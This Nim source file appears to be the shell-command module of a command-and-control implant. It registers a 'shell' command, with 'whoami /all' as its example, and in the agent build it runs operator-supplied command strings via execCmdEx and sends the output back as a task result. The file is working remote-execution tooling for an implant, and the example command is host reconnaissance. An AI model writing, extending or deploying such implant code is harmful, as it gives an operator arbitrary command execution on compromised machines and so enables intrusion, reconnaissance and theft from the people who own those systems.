import ../common/[types, utils]

# Define function prototype
proc executeShell(config: AgentConfig, task: Task): TaskResult 

# Command definition (as seq[Command])
let commands*: seq[Command] =  @[
    Command(
        name: "shell",
        commandType: CMD_SHELL,
        description: "Execute a shell command and retrieve the output.",
        example: "shell whoami /all",
        arguments: @[
            Argument(name: "command", description: "Command to be executed.", argumentType: STRING, isRequired: true),
            Argument(name: "arguments", description: "Arguments to be passed to the command.", argumentType: STRING, isRequired: false)
        ],
        execute: executeShell
    )
]

# Implement execution functions
when defined(server):
    proc executeShell(config: AgentConfig, task: Task): TaskResult = nil

when defined(agent):

    import ../agent/core/taskresult
    import osproc, strutils, strformat
    
    proc executeShell(config: AgentConfig, task: Task): TaskResult = 
        try: 
            var 
                command: string 
                arguments: string

            # Parse arguments 
            case int(task.argCount): 
            of 1: # Only the command has been passed as an argument
                command = task.args[0].data.toString()
                arguments = ""
            of 2: # The optional 'arguments' parameter was included
                command = task.args[0].data.toString()
                arguments = task.args[1].data.toString()
            else:  
                discard 

            echo fmt"   [>] Executing: {command} {arguments}."

            let (output, status) = execCmdEx(fmt("{command} {arguments}")) 

            if output != "":
                return createTaskResult(task, cast[StatusType](status), RESULT_STRING, output.toBytes())
            else: 
                return createTaskResult(task, cast[StatusType](status), RESULT_NO_OUTPUT, @[])

        except CatchableError as err: 
            return createTaskResult(task, STATUS_FAILED, RESULT_STRING, err.msg.toBytes())
